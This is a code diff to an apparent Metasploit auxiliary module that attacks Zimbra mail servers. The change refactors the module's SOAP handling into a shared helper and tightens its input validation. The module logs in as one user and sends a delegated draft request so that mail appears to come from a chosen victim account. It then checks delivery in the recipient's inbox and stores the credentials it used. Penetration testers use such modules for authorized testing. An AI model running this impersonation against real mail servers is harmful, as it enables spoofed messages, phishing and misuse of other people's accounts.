@@ -4,14 +4,11 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::Zimbra
   include Msf::Exploit::Retry
   include Msf::Auxiliary::Report
   prepend Msf::Exploit::Remote::AutoCheck
 
-  ZIMBRA_SOAP_NS = 'http://www.w3.org/2003/05/soap-envelope'
-  ZIMBRA_CONTEXT_NS = 'urn:zimbra'
-  ZIMBRA_ACCOUNT_NS = 'urn:zimbraAccount'
   ZIMBRA_MAIL_NS = 'urn:zimbraMail'
 
   def initialize(info = {})
@@ -111,7 +108,7 @@ class MetasploitModule < Msf::Auxiliary
     fail_for_context!(verification, 'prepare delivery verification') if verification && verification[:status] != :success
 
     marker = verification ? SecureRandom.hex(12) : nil
-    context[:subject] = datastore['SUBJECT']
+    context[:subject] = normalized_option('SUBJECT')
     context[:subject] = "#{context[:subject]} [MSF-#{marker}]" if marker
 
     print_status("Sending a delegated message from #{context[:victim]} to #{context[:recipient]}")
@@ -155,47 +152,52 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def option_error
-    %w[USERNAME PASSWORD VICTIM RECIPIENT SUBJECT].each do |option|
-      value = datastore[option]
-      return "#{option} must not be empty" if value.blank?
-      return "#{option} contains an XML control character" if xml_control?(value)
-    end
     %w[USERNAME VICTIM RECIPIENT].each do |option|
       value = datastore[option]
-      return "#{option} must be a single line" if value.match?(/[\r\n]/)
-      return "#{option} must contain a domain" unless value.include?('@')
-      return "#{option} must contain at most 320 bytes" if value.bytesize > 320
+      reason = zimbra_account_name_error(value, option)
+      return reason if reason
+      return "#{option} must contain at most 320 bytes" if value.encode(::Encoding::UTF_8).bytesize > 320
     end
-    return 'VICTIM must differ from USERNAME' if datastore['VICTIM'].casecmp?(datastore['USERNAME'])
-    return 'SUBJECT must be a single line' if datastore['SUBJECT'].match?(/[\r\n]/)
-    return 'SUBJECT must contain at most 470 bytes' if datastore['SUBJECT'].bytesize > 470
-    return 'BODY must contain at most 1,048,576 bytes' if datastore['BODY'].to_s.bytesize > 1_048_576
-    return 'BODY contains an XML control character' if xml_control?(datastore['BODY'].to_s)
+    return 'PASSWORD must not be empty' unless option_present?('PASSWORD')
+    return 'PASSWORD cannot be represented in XML 1.0' if zimbra_xml_control?(datastore['PASSWORD'])
+
+    subject = datastore['SUBJECT']
+    return 'SUBJECT must not be empty' unless option_present?('SUBJECT')
+    return 'SUBJECT cannot be represented in XML 1.0' if zimbra_xml_control?(subject)
+
+    subject = subject.encode(::Encoding::UTF_8)
+    return 'SUBJECT must be a single line' if subject.match?(/[\r\n]/)
+    return 'SUBJECT must contain at most 470 bytes' if subject.bytesize > 470
+
+    body = datastore['BODY'].to_s
+    return 'BODY cannot be represented in XML 1.0' if zimbra_xml_control?(body)
+    return 'BODY must contain at most 1,048,576 bytes' if body.encode(::Encoding::UTF_8).bytesize > 1_048_576
     return 'VERIFY_USERNAME and VERIFY_PASSWORD must be supplied together' if verification_partial?
     return 'VERIFY_TIMEOUT must be between 1 and 120' unless datastore['VERIFY_TIMEOUT'].between?(1, 120)
 
     if verification_configured?
-      %w[VERIFY_USERNAME VERIFY_PASSWORD].each do |option|
-        value = datastore[option]
-        return "#{option} contains an XML control character" if xml_control?(value)
-      end
-      return 'VERIFY_USERNAME must be a single line' if datastore['VERIFY_USERNAME'].match?(/[\r\n]/)
-      return 'VERIFY_USERNAME must contain a domain' unless datastore['VERIFY_USERNAME'].include?('@')
+      reason = zimbra_account_name_error(datastore['VERIFY_USERNAME'], 'VERIFY_USERNAME')
+      return reason if reason
+      return 'VERIFY_PASSWORD cannot be represented in XML 1.0' if zimbra_xml_control?(datastore['VERIFY_PASSWORD'])
     end
 
     nil
   end
 
-  def xml_control?(value)
-    value.match?(/[\x00-\x08\x0b\x0c\x0e-\x1f]/)
-  end
-
   def verification_partial?
-    datastore['VERIFY_USERNAME'].present? != datastore['VERIFY_PASSWORD'].present?
+    option_present?('VERIFY_USERNAME') != option_present?('VERIFY_PASSWORD')
   end
 
   def verification_configured?
-    datastore['VERIFY_USERNAME'].present? && datastore['VERIFY_PASSWORD'].present?
+    option_present?('VERIFY_USERNAME') && option_present?('VERIFY_PASSWORD')
+  end
+
+  def option_present?(name)
+    datastore[name].is_a?(String) && !datastore[name].empty?
+  end
+
+  def normalized_option(name)
+    datastore[name].encode(::Encoding::UTF_8)
   end
 
   def prepare_context
@@ -206,7 +208,6 @@ class MetasploitModule < Msf::Auxiliary
 
     info = zimbra_get_info(authentication[:token])
     return info unless info[:status] == :success
-    return { status: :unexpected, reason: 'GetInfoResponse omitted the authenticated account name' } if info[:name].blank?
 
     report_soap_service(info[:version])
 
@@ -219,7 +220,7 @@ class MetasploitModule < Msf::Auxiliary
       token: authentication[:token],
       attacker: info[:name],
       victim: victim[:name],
-      recipient: datastore['RECIPIENT'],
+      recipient: normalized_option('RECIPIENT'),
       version: info[:version]
     }
   end
@@ -238,7 +239,6 @@ class MetasploitModule < Msf::Auxiliary
 
     info = zimbra_get_info(authentication[:token])
     return info unless info[:status] == :success
-    return { status: :unexpected, reason: 'Verification GetInfoResponse omitted the account name' } if info[:name].blank?
     unless info[:name].casecmp?(context[:recipient])
       return { status: :bad_config, reason: "VERIFY_USERNAME resolves to #{info[:name]}, not RECIPIENT" }
     end
@@ -246,65 +246,23 @@ class MetasploitModule < Msf::Auxiliary
     { status: :success, token: authentication[:token], account: info[:name] }
   end
 
-  def zimbra_authenticate(username, password)
-    document = Nokogiri::XML::Builder.new(encoding: 'UTF-8') do |xml|
-      xml['soap'].Envelope('xmlns:soap' => ZIMBRA_SOAP_NS) do
-        xml['soap'].Body do
-          xml.AuthRequest('xmlns' => ZIMBRA_ACCOUNT_NS, 'persistAuthTokenCookie' => '0') do
-            xml.account(username, 'by' => 'name')
-            xml.password(password)
-          end
-        end
-      end
-    end.to_xml
-    result = zimbra_request(document, 'AuthResponse', ZIMBRA_ACCOUNT_NS)
-    return result unless result[:status] == :success
-
-    token = result[:node].at_xpath('./account:authToken', 'account' => ZIMBRA_ACCOUNT_NS)&.text
-    return { status: :unexpected, reason: 'AuthResponse omitted authToken' } if token.blank?
-
-    { status: :success, token: token, code: result[:code] }
-  end
-
-  def zimbra_get_info(token)
-    result = zimbra_request(
-      zimbra_envelope(token) { |xml| xml.GetInfoRequest('xmlns' => ZIMBRA_ACCOUNT_NS, 'sections' => 'mbox') },
-      'GetInfoResponse', ZIMBRA_ACCOUNT_NS
-    )
-    return result unless result[:status] == :success
-
-    {
-      status: :success,
-      name: result[:node].at_xpath('./account:name', 'account' => ZIMBRA_ACCOUNT_NS)&.text,
-      version: result[:node].at_xpath('./account:version', 'account' => ZIMBRA_ACCOUNT_NS)&.text&.strip
-    }
-  end
-
-  def zimbra_account_info(token, name)
-    document = zimbra_envelope(token) do |xml|
-      xml.GetAccountInfoRequest('xmlns' => ZIMBRA_ACCOUNT_NS) { xml.account(name, 'by' => 'name') }
-    end
-    result = zimbra_request(document, 'GetAccountInfoResponse', ZIMBRA_ACCOUNT_NS)
-    return result unless result[:status] == :success
-
-    canonical = result[:node].at_xpath('./account:name', 'account' => ZIMBRA_ACCOUNT_NS)&.text
-    return { status: :unexpected, reason: 'GetAccountInfoResponse omitted the account name' } if canonical.blank?
-
-    { status: :success, name: canonical }
-  end
-
   def send_impersonated_email(context)
-    document = zimbra_envelope(context[:token]) do |xml|
+    document = zimbra_soap_envelope(auth_token: context[:token]) do |xml|
       xml.SaveDraftRequest('xmlns' => ZIMBRA_MAIL_NS, 'isDelegatedReq' => '1') do
         xml.m do
           xml.e('t' => 't', 'a' => context[:recipient])
           xml.e('t' => 'f', 'a' => context[:victim])
           xml.su(context[:subject])
-          xml.mp('ct' => "text/#{datastore['FORMAT']}") { xml.content(datastore['BODY']) }
+          xml.mp('ct' => "text/#{datastore['FORMAT']}") { xml.content(normalized_option('BODY')) }
         end
       end
     end
-    result = zimbra_request(document, 'SaveDraftResponse', ZIMBRA_MAIL_NS)
+    result = zimbra_soap_request(
+      document,
+      expected_response: 'SaveDraftResponse',
+      namespace: ZIMBRA_MAIL_NS,
+      auth_token: context[:token]
+    )
     return result unless result[:status] == :success
 
     message = result[:node].at_xpath('./mail:m', 'mail' => ZIMBRA_MAIL_NS)
@@ -342,12 +300,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def search_marker(token, marker)
-    document = zimbra_envelope(token) do |xml|
+    document = zimbra_soap_envelope(auth_token: token) do |xml|
       xml.SearchRequest('xmlns' => ZIMBRA_MAIL_NS, 'types' => 'message', 'limit' => '10') do
         xml.query("in:inbox MSF-#{marker}")
       end
     end
-    result = zimbra_request(document, 'SearchResponse', ZIMBRA_MAIL_NS)
+    result = zimbra_soap_request(document, expected_response: 'SearchResponse', namespace: ZIMBRA_MAIL_NS, auth_token: token)
     return result unless result[:status] == :success
 
     messages = result[:node].xpath('./mail:m', 'mail' => ZIMBRA_MAIL_NS)
@@ -359,68 +317,6 @@ class MetasploitModule < Msf::Auxiliary
 
     from = message.at_xpath('./mail:e[@t="f"]', 'mail' => ZIMBRA_MAIL_NS)&.[]('a')
     { status: :success, from: from, id: message['id'] }
-  end
-
-  def zimbra_envelope(token)
-    Nokogiri::XML::Builder.new(encoding: 'UTF-8') do |xml|
-      xml['soap'].Envelope('xmlns:soap' => ZIMBRA_SOAP_NS) do
-        xml['soap'].Header do
-          # Nokogiri::XML::Builder reserves context, so invoke its element fallback explicitly.
-          xml.send(:method_missing, 'z:context', { 'xmlns:z' => ZIMBRA_CONTEXT_NS }) { xml['z'].authToken(token) }
-        end
-        xml['soap'].Body { yield xml }
-      end
-    end.to_xml
-  end
-
-  def zimbra_request(document, expected_response, namespace)
-    response = send_request_cgi(
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'service', 'soap'),
-      'ctype' => 'application/soap+xml; charset=utf-8',
-      'data' => document
-    )
-    return { status: :unreachable, reason: 'No response from Zimbra SOAP' } unless response
-    return { status: :bad_config, reason: "HTTP #{response.code} did not expose Zimbra SOAP at TARGETURI" } if [404, 405].include?(response.code)
-
-    parsed = parse_xml_response(response)
-    return parsed unless parsed[:status] == :success
-
-    fault = parsed[:document].at_xpath('/soap:Envelope/soap:Body/soap:Fault', 'soap' => ZIMBRA_SOAP_NS)
-    if fault
-      fault_code = soap_fault_code(parsed[:document])
-      return { status: :auth_failed, reason: 'Zimbra rejected the credentials' } if expected_response == 'AuthResponse' && fault_code
-      if expected_response == 'GetAccountInfoResponse' && %w[account.NO_SUCH_ACCOUNT service.PERM_DENIED].include?(fault_code)
-        return { status: :not_found, reason: 'The requested Zimbra account could not be resolved' }
-      end
-
-      reason = fault_code ? "Zimbra SOAP fault #{fault_code}" : 'Zimbra SOAP Fault without a Zimbra error code'
-      return { status: :soap_error, reason: reason }
-    end
-    return { status: :unexpected, reason: "HTTP #{response.code} did not confirm #{expected_response}" } unless response.code == 200
-
-    node = parsed[:document].at_xpath(
-      "/soap:Envelope/soap:Body/expected:#{expected_response}",
-      'soap' => ZIMBRA_SOAP_NS,
-      'expected' => namespace
-    )
-    return { status: :success, node: node, code: response.code } if node
-
-    { status: :unexpected, reason: "HTTP #{response.code} omitted #{expected_response}" }
-  end
-
-  def parse_xml_response(response)
-    document = response.get_xml_document
-    if document.nil? || !document.is_a?(Nokogiri::XML::Document) || document.errors.any? || document.root.nil?
-      return { status: :unexpected, reason: "HTTP #{response.code} did not contain well-formed XML" }
-    end
-
-    { status: :success, document: document }
-  end
-
-  def soap_fault_code(document)
-    namespaces = { 'soap' => ZIMBRA_SOAP_NS, 'zimbra' => ZIMBRA_CONTEXT_NS }
-    document.at_xpath('/soap:Envelope/soap:Body/soap:Fault/soap:Detail/zimbra:Error/zimbra:Code', namespaces)&.text
   end
 
   def version_state(version_string)
@@ -444,19 +340,25 @@ class MetasploitModule < Msf::Auxiliary
     case result[:status]
     when :unreachable
       fail_with(Failure::Unreachable, "Unable to #{operation}: #{reason}")
-    when :auth_failed
+    when :auth_failed, :authentication_incomplete
       fail_with(Failure::NoAccess, "Unable to #{operation}: #{reason}")
     when :not_found, :bad_config
       fail_with(Failure::BadConfig, "Unable to #{operation}: #{reason}")
     when :not_vulnerable
       fail_with(Failure::NotVulnerable, "Unable to #{operation}: #{reason}")
+    when :soap_fault
+      if %w[service.PERM_DENIED service.AUTH_REQUIRED].include?(result[:fault_code])
+        fail_with(Failure::NoAccess, "Unable to #{operation}: #{reason}")
+      end
+
+      fail_with(Failure::UnexpectedReply, "Unable to #{operation}: #{reason}")
     else
       fail_with(Failure::UnexpectedReply, "Unable to #{operation}: #{reason}")
     end
   end
 
   def result_reason(result)
-    result[:reason].presence || result[:status].to_s
+    result[:reason].presence || result[:fault_code].presence || result[:http_code].presence || result[:status].to_s
   end
 
   def record_authentication(username, password, authentication)
@@ -477,7 +379,7 @@ class MetasploitModule < Msf::Auxiliary
       user: username,
       private: password,
       private_type: :password,
-      proof: authentication[:code],
+      proof: authentication[:http_code],
       service_data: service_data
     )
     @recorded_credentials[username] = true
